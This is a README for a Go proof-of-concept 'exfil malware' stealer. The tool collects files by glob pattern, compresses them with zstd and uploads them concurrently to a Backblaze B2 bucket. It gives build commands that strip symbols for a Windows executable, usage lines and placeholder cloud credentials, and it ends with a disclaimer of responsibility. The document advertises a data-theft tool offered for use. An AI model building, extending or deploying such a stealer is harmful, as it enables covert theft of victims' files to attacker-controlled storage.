# golang exfil malware POC

A high-performance file exfiltration/stealer for Backblaze B2 that uses goroutines for concurrent uploads and zstd compression for reduced file sizes.

## Features

- Concurrent file uploads using goroutines
- zstd compression with fastest preset
- Dynamic CPU-based worker scaling
- Progress tracking
- Glob pattern support for file selection
- Efficient memory usage with buffer pools
- Automatic file grouping for optimal uploads

## Prerequisites

- Go 1.19 or later
- Backblaze B2 account and credentials

# To Build

```bash
go build -ldflags="-w -s" -trimpath -o exfilPOC.exe ./cmd/uploader
```
or for linux (will require you to add in linux target dirs and skip paths in walker.go)

```bash
GOOS=linux GOARCH=amd64 go build -ldflags="-w -s" -trimpath -o exfilPOC.exe ./cmd/uploader
```




## Usage

```bash
./uploader.exe -glob "path/to/files/*.txt" -group-size 100000000
```
or just run it to use default config

## Configuration

The application is configured to use:
- Endpoint: s3.region-here.backblazeb2.com
- Bucket: bucket-name-here
- Key ID: key-id-here
- Key Name: key-name-here
- App Key: app-key-here

## NOTICE

This is a proof of concept and is not meant to be used in production or for any malicious purposes. I am not responsible for your actions, or repurposing of this code.



